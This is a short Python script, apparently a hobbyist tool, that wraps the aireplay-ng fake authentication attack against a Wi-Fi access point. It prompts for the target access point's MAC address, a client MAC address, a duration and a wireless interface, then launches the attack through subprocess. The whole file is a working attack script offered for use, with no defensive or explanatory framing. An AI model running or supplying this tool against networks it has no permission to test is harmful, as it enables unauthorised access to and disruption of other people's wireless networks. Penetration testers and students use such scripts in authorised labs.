import subprocess
import subprocess

def run_fakeauth_attack( time, ap_mac, client_mac, interface):
    print("Running fake authentication...")
    command = ['aireplay-ng', '--fakeauth', str(time), '-a', ap_mac, '-h', client_mac, interface]
    subprocess.run(command)
    print("Fake authentication attack completed.")

def main():
    print('Displaying the mac address (****Usually the first 12 digits on the unspec field*****)')
    print("=============================================")
    subprocess.run(['ifconfig'])
    print("=============================================")
    print("Wi-Fi Fake Authentication Attack Script")
    print("=============================================")

    print("Before running this script, make sure you have airodump-ng running in another tab to capture target information.")
    
    ap_mac = input("Enter the target AP MAC address: ")
    client_mac = input("Enter the client MAC address: ")
    time = input("Enter the duration for fake authentication attack (in seconds, default is 0): ").strip() or '0'
    interface = input("Enter the Wi-Fi interface name: ")

    run_fakeauth_attack(time, ap_mac, client_mac, interface)

if __name__ == '__main__':
    main()
